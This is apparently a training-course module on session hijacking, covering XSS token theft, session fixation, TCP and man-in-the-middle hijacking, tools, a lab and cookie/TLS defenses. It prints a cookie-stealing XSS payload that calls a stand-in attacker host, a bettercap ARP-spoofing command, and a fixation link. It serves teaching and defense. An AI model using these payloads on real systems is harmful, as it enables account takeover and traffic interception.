# Session Hijacking

> What you'll learn: how attackers steal or take over an active login session, the application-level and network-level techniques they use, the tools involved, and how defenders stop them with secure cookies and TLS.
> Prerequisites: basic understanding of HTTP requests/responses, what a cookie is, TCP/IP fundamentals, and (helpful) prior exposure to XSS and sniffing concepts.

| Course | Course code | Module | Level |
|--------|-------------|--------|-------|
| Skillogic CSPP – Professional Level 2 | SKL-CSP2-711 | Module 03 – Session Hijacking | level2 |

---

## 1. In Plain English

Imagine you walk into a members-only club. At the door, the bouncer checks your ID once, then hands you a wristband. For the rest of the night you never show your ID again — you just flash the wristband and walk straight in. The wristband is convenient, but it has a dangerous property: **whoever wears it gets in**. If someone slips it off your wrist or makes an identical copy, they can enter as "you," and the bouncer will never know the difference.

On the web, that wristband is your **session** — and the little piece of data that represents it is your **session token** (also called a session ID). When you log into your email or bank, the server checks your password *once*, then issues a session token that your browser sends with every subsequent request. **Session hijacking** is the attack where someone steals or forges that token so the server treats them as you.

Why should a beginner care? Because session hijacking sidesteps the password entirely. The attacker doesn't need to crack your strong 20-character passphrase or your multi-factor code — they just need the wristband you're already wearing. That's what makes it one of the most practical and dangerous attacks on the web, and why understanding it is core to defending real applications.

This note covers two big families of the attack: **application-level hijacking** (stealing the token using web flaws like cross-site scripting, or tricking the app with session fixation) and **network-level hijacking** (grabbing the token off the wire by attacking the TCP connection itself). We'll finish with the defenses — secure cookies and TLS — that take the "magic wristband" off the table.

---

## 2. Core Concepts

### What is a session?

HTTP is **stateless** — meaning each request the server receives is independent and carries no memory of the previous one. By itself, HTTP has no idea that the request loading your inbox came from the same person who just logged in. To solve this, web apps create a **session**: a server-side record (your identity, permissions, shopping cart, etc.) that persists across many requests. To link each incoming request back to that record, the server gives the browser a **session identifier**.

### Session token / session ID

A **session token** (session ID) is a string — ideally long and random, e.g. `JSESSIONID=9F8A...3C` — that uniquely points to your session record on the server. It is most commonly stored in a **cookie**: a small piece of data the server sets via the `Set-Cookie` header, which the browser then automatically attaches to every future request to that site. The token can also be passed in a URL parameter or in custom headers, but cookies are the norm.

Crucially, the token is a **bearer credential**: possession equals authority. Anyone who holds a valid, unexpired token is treated as the authenticated user. This is the whole reason session hijacking works.

### Session hijacking

**Session hijacking** is the act of obtaining a valid session token (or otherwise taking control of an established session) so the attacker can impersonate the legitimate user *without* their password. The attacker effectively "rides" an already-authenticated connection.

There are two broad categories:

### Application-level hijacking

Here the attacker targets the web application and the browser, aiming to **steal or manipulate the session token**. The main techniques:

- **Session token theft via XSS** — **Cross-Site Scripting (XSS)** is a flaw where an attacker injects malicious JavaScript into a page that another user's browser then runs. If the cookie isn't protected, that script can read the session cookie (`document.cookie`) and send it to the attacker.
- **Session sniffing** — capturing the token as it travels over an unencrypted channel (covered more under network-level).
- **Session fixation** — instead of stealing a token *after* you log in, the attacker **sets a token for you before you log in**, then reuses that known token after you authenticate.
- **Session prediction / brute force** — if tokens are short or generated with a weak, guessable pattern (e.g. sequential numbers or a timestamp), an attacker can guess a valid one.

### Session fixation (in detail)

In **session fixation**, the attacker first obtains a valid (but not-yet-authenticated) session ID from the application — for example by simply visiting the site. They then trick the victim into using *that same* session ID, often by sending a crafted link like `https://bank.example/login?SESSIONID=ATTACKER_KNOWN_VALUE`. The victim clicks, logs in with their real credentials, and the application — if poorly built — keeps the **same** session ID and just marks it as "authenticated." Now the attacker, who already knows that ID, is suddenly logged in as the victim. The fix is simple in principle: **always issue a brand-new session ID at the moment of login** (session regeneration).

### Network-level hijacking

Here the attacker operates lower down the stack, attacking the **transport** rather than the app. The token (or the entire session) is captured or controlled at the TCP/IP level.

- **TCP session hijacking** — Every TCP connection is tracked using **sequence numbers** (counters that order the bytes in a stream). If an attacker can see the traffic (e.g. on the same LAN or Wi-Fi) and learn the current sequence numbers, they can inject their own packets that the server accepts as part of the legitimate connection, effectively taking it over. This may involve **desynchronizing** the real client so it falls out of sync.
- **Blind hijacking** — a harder variant where the attacker **cannot see** the traffic and must *guess* or predict the sequence numbers to inject valid packets "blind." Modern OSes use randomized initial sequence numbers, which makes this much harder than it once was.
- **Man-in-the-Middle (MITM)** — the attacker positions between client and server (via ARP spoofing, rogue Wi-Fi access point, DNS spoofing, etc.) so all traffic flows through them, allowing them to read tokens on unencrypted connections.

### Why TLS changes everything

**TLS (Transport Layer Security)** — the encryption behind HTTPS — encrypts the traffic between browser and server. On a properly configured HTTPS site, a network sniffer sees only ciphertext, not the cookie. This neutralizes most network-level theft and sniffing. It does **not**, however, stop application-level attacks like XSS, because there the malicious code runs *inside* the victim's trusted browser, after decryption.

---

## 3. How It Works (Step by Step)

Let's walk through a classic **application-level hijack using XSS-based token theft**, the most common real-world scenario.

1. **Victim logs in.** The user authenticates to `app.example`. The server issues a session cookie, e.g. `Set-Cookie: SESSIONID=abc123`. The browser stores it.
2. **Attacker finds an XSS hole.** Suppose a comment field on the site renders user input without sanitizing it. The attacker posts a comment containing JavaScript such as `<script>new Image().src='https://evil.example/c?'+document.cookie</script>`.
3. **Victim views the malicious content.** When the victim loads the page with that comment, *their* browser executes the attacker's script in the context of `app.example`.
4. **The script reads the cookie.** Because the cookie was not protected with the `HttpOnly` flag, `document.cookie` exposes `SESSIONID=abc123` to the script.
5. **The token is exfiltrated.** The script silently sends the cookie value to `evil.example` (here disguised as an image request).
6. **Attacker replays the token.** The attacker sets `SESSIONID=abc123` in their own browser/tool and requests a protected page. The server sees a valid token and serves the victim's account — no password needed.
7. **Detection / defense kicks in (or should).** Server-side anomaly checks (new IP, new device fingerprint, impossible geographic travel) can flag the reuse and force re-authentication.

```mermaid
sequenceDiagram
    participant V as Victim Browser
    participant S as App Server
    participant A as Attacker
    V->>S: 1. Login (username/password)
    S-->>V: 2. Set-Cookie: SESSIONID=abc123
    A->>S: 3. Inject XSS payload (e.g. in a comment)
    V->>S: 4. Loads page containing payload
    S-->>V: 5. Page + malicious <script>
    Note over V: 6. Script runs, reads document.cookie
    V->>A: 7. Exfiltrate SESSIONID=abc123
    A->>S: 8. Replay request with stolen cookie
    S-->>A: 9. Serves victim's account (hijacked)
    Note over S: Defense: HttpOnly cookie blocks step 6;<br/>anomaly detection flags step 8
```

---

## 4. Real-World Examples

**Firesheep (2010).** A widely publicized Firefox extension demonstrated how trivially session cookies could be stolen on open Wi-Fi. Many large sites at the time only used HTTPS for the *login page* and then dropped back to plain HTTP. Firesheep simply sniffed those unencrypted cookies on the shared network and let anyone "one-click" hijack other people's logged-in sessions (Facebook, Twitter, etc., as they were configured then). The fallout pushed the entire industry toward **HTTPS everywhere** — encrypting the whole session, not just the login.

**Session fixation against poorly built login flows.** A recurring real-world weakness, catalogued by OWASP, is web apps that accept a session ID supplied by the user and reuse it after login. Attackers craft links that pin a known session ID onto the victim; once the victim authenticates, the attacker shares the session. Modern frameworks mitigate this by regenerating the session ID on privilege change, but legacy and custom apps are still found vulnerable in penetration tests.

**XSS-driven cookie theft.** Numerous documented bug-bounty findings and breaches trace back to a stored or reflected XSS flaw that an attacker used to harvest session cookies. The pattern is consistent: an input field renders attacker-controlled markup, the cookie lacks `HttpOnly`, and a one-line script ships the token off-site. This is why XSS and session hijacking are taught together — the former is frequently the delivery mechanism for the latter.

---

## 5. Tools of the Trade

> All tools below are for use on systems you own or are explicitly authorized to test.

### Wireshark
A network protocol analyzer that captures and inspects packets, used to observe (on unencrypted traffic) where cookies and tokens travel and to study TCP sequence numbers.

```bash
# Capture traffic on interface eth0, filter to HTTP only
wireshark -i eth0 -k -f "tcp port 80"
```
Launches a live capture limited to TCP port 80; you then apply a display filter like `http.cookie` to spot session tokens in cleartext requests. On an HTTPS site you'd see only encrypted bytes — demonstrating why TLS defeats sniffing.

### Burp Suite
An intercepting web proxy that sits between your browser and the app, letting you inspect, modify, and replay requests — ideal for studying cookie flags and testing token reuse.

```text
1. Configure browser proxy to 127.0.0.1:8080
2. Intercept a logged-in request in Proxy > HTTP history
3. Send to Repeater, modify or swap the session cookie value, resend
```
This lets you confirm whether a stolen/altered token is accepted, and whether the cookie carries `Secure` / `HttpOnly` flags.

### ettercap / bettercap
MITM frameworks that perform ARP spoofing to redirect LAN traffic through the attacker, used to demonstrate network-level interception in a lab.

```bash
# bettercap: enable ARP spoofing against a target in the lab subnet
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.56.20; arp.spoof on; net.sniff on"
```
Poisons the target's ARP table so its traffic flows through the attacker, then sniffs it. On cleartext HTTP this exposes cookies; on HTTPS it does not (without an additional, separately detectable TLS-stripping or rogue-cert step).

### Browser DevTools
The built-in inspector shows cookies and their security flags — the quickest way to audit whether a token is protected.

```text
DevTools > Application > Cookies > select the site
Inspect each cookie's HttpOnly, Secure, and SameSite columns
```
If `HttpOnly` is unchecked, JavaScript (and thus XSS) can read the token — a direct red flag.

---

## 6. Hands-On Lab (Authorized / Lab-Only)

> Reminder: perform this **only** on systems you own or are explicitly authorized to test. Never run any of this against third-party services or networks.

**Goal:** Build a small lab, demonstrate both an application-level (XSS) and a network-level (sniffing) hijack, then prove the corresponding defenses neutralize each.

**Lab setup (multi-VM or cloud sandbox):**
- VM 1 — **Target app**: deploy a deliberately vulnerable web app (e.g. OWASP Juice Shop or DVWA) in a container on an isolated host-only network.
- VM 2 — **Victim**: a Linux/Windows desktop VM running a normal browser, logged into the target app.
- VM 3 — **Attacker**: Kali (or any pentest distro) with Wireshark, Burp Suite, and bettercap installed.
- Place all three on a **host-only / NAT lab network** with no route to the internet or other machines.

**Part A — Application-level (XSS token theft):**
1. On the attacker VM, stand up a tiny listener to receive exfiltrated data (e.g. a one-line Python HTTP server logging query strings).
2. From the victim, log into the vulnerable app and confirm a session cookie exists in DevTools.
3. Find an input field vulnerable to stored XSS. Craft a payload that reads `document.cookie` and sends it to your attacker listener. (Adapt the exact payload to the app's filtering — bypassing weak filters is part of the exercise.)
4. As the victim, view the page hosting your payload. Confirm the cookie arrives at the attacker listener.
5. On the attacker, replay the captured token (use Burp Repeater to swap the cookie into a request) and confirm you reach the victim's authenticated area.

**Part B — Network-level (sniffing):**
1. With the app served over plain HTTP, start a Wireshark capture on the attacker and run bettercap ARP spoofing against the victim.
2. Have the victim browse the app; locate the `Cookie:` header in the captured cleartext traffic.

**Validation — prove the defenses work (the most important part):**
1. **Defeat Part A:** Reconfigure the app to set the session cookie with `HttpOnly`. Repeat Part A — the XSS payload should now fail to read the cookie (`document.cookie` no longer contains it). Document the difference.
2. **Defeat Part B:** Enable HTTPS/TLS on the app and re-run the sniff. Confirm Wireshark now shows only encrypted TLS records and the cookie is no longer visible. Optionally set the `Secure` flag and confirm the cookie is never sent over plain HTTP at all.
3. **Defeat fixation:** Configure the framework to regenerate the session ID on login; verify the pre-login ID differs from the post-login ID.
4. **Detection step:** Enable server logging of session-token source IP / user agent and write a simple rule (or review logs) that flags the same token appearing from two different IPs simultaneously — the signature of replay.

Capture before/after screenshots for each defense to build an evidence trail.

---

## 7. Countermeasures & Defenses

**Protect the token in transit:**
- Enforce **HTTPS/TLS everywhere** (not just the login page) so tokens can't be sniffed.
- Add **HSTS** (HTTP Strict Transport Security) so browsers refuse to connect over plain HTTP.
- Mark cookies **`Secure`** so the browser only ever sends them over HTTPS.

**Protect the token in the browser:**
- Mark session cookies **`HttpOnly`** so JavaScript (and XSS) cannot read them.
- Set **`SameSite`** (`Lax` or `Strict`) to limit cookies being sent on cross-site requests, reducing CSRF and some hijack vectors.
- Prevent the underlying **XSS** with output encoding, input validation, and a strong **Content-Security-Policy (CSP)**.

**Make tokens hard to steal or guess:**
- Generate tokens with a **cryptographically secure random** source; make them long (high entropy) so prediction/brute force is infeasible.
- **Regenerate the session ID on login** and on any privilege change to kill session fixation.
- Set sensible **idle and absolute timeouts**; invalidate the session server-side on logout (don't just delete the cookie).

**Detect and respond:**
- Bind sessions to contextual signals (IP range, device fingerprint, user agent) and **re-authenticate on anomalies** like impossible travel or a sudden IP change.
- Log token usage and alert when the **same token is used from two locations** at once.
- Use **MFA** so a stolen session has limited blast radius and re-auth can be enforced for sensitive actions.

**Harden the network layer:**
- Use modern OSes with **randomized TCP initial sequence numbers** to thwart blind hijacking.
- On managed networks, deploy **dynamic ARP inspection / port security** to limit ARP-spoofing MITM.

---

## 8. Key Terms

- **Session** — server-side state that links many HTTP requests to one authenticated user.
- **Session token / session ID** — the random string that identifies a session; a bearer credential.
- **Cookie** — small data item set by the server (`Set-Cookie`) and auto-sent by the browser; the usual home of the session token.
- **Session hijacking** — taking over a valid session by stealing or controlling its token.
- **XSS (Cross-Site Scripting)** — injecting attacker JavaScript that runs in a victim's browser; a common token-theft vector.
- **Session fixation** — forcing a victim to use an attacker-known session ID before login.
- **Sniffing** — passively capturing network traffic to read data such as cookies.
- **TCP sequence number** — counter ordering bytes in a TCP stream; key to network-level injection.
- **Blind hijacking** — injecting TCP packets without seeing the traffic, by guessing sequence numbers.
- **MITM (Man-in-the-Middle)** — positioning between client and server to read/alter traffic.
- **TLS / HTTPS** — encryption that protects traffic in transit and defeats sniffing.
- **HttpOnly** — cookie flag blocking JavaScript access to the cookie.
- **Secure** — cookie flag restricting the cookie to HTTPS connections only.
- **SameSite** — cookie flag controlling whether cookies are sent on cross-site requests.
- **Session regeneration** — issuing a new session ID after login to defeat fixation.

## 9. Summary & Takeaways

- A session token is a **bearer credential** — whoever holds it is "you," so stealing it bypasses the password entirely.
- **Application-level hijacking** steals or manipulates the token via XSS, fixation, or weak/predictable tokens.
- **Network-level hijacking** captures or seizes the session at the TCP/IP layer through sniffing, MITM, or sequence-number injection (including blind variants).
- **TLS/HTTPS everywhere** kills most network-level theft; **HttpOnly + Secure + SameSite** cookies plus XSS prevention kill most application-level theft.
- **Regenerating the session ID on login** is the direct, decisive fix for session fixation.
- Strong, random, time-limited tokens plus anomaly detection and MFA limit damage even when a token leaks.
- Defense is layered: protect the token *in transit*, *in the browser*, and *at rest on the server*, and watch for reuse.

**Further reading:** OWASP Session Management Cheat Sheet and OWASP Testing Guide (session management / fixation); OWASP Top 10 (Identification and Authentication Failures); NIST SP 800-63B (Digital Identity / session management guidance); MITRE ATT&CK techniques for "Steal Web Session Cookie" and "Session Hijacking."
